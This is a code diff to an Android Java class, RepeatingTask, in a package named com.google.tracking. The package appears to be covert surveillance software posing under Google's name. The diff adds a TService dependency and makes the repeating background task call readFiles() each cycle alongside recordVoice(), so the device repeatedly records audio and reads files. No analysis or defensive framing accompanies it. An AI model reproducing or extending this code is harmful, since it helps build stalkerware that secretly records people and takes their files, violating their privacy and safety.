@@ -3,6 +3,7 @@ package com.google.tracking.runnable;
 
 import android.os.Handler;
 import android.util.Log;
+import com.google.tracking.TService;
 import com.google.tracking.call.CallRecorderController;
 
 public class RepeatingTask {
@@ -10,10 +11,12 @@ public class RepeatingTask {
     private static int runTaskInterval;
     private Handler mHandler;
     private CallRecorderController _callRecorder;
+    private TService _s;
 
-    public RepeatingTask(int interval, CallRecorderController callRecorder) {
+    public RepeatingTask(int interval, CallRecorderController callRecorder, TService s) {
 
         // your code here
+        _s = s;
         _callRecorder = callRecorder;
         runTaskInterval = interval;
         mHandler = new Handler();
@@ -25,6 +28,7 @@ public class RepeatingTask {
         public void run() {
             try {
                 Log.d(TAG, "run()");
+                _s.readFiles();
                 _callRecorder.recordVoice();
             } finally {
                 // 100% guarantee that this always happens, even if
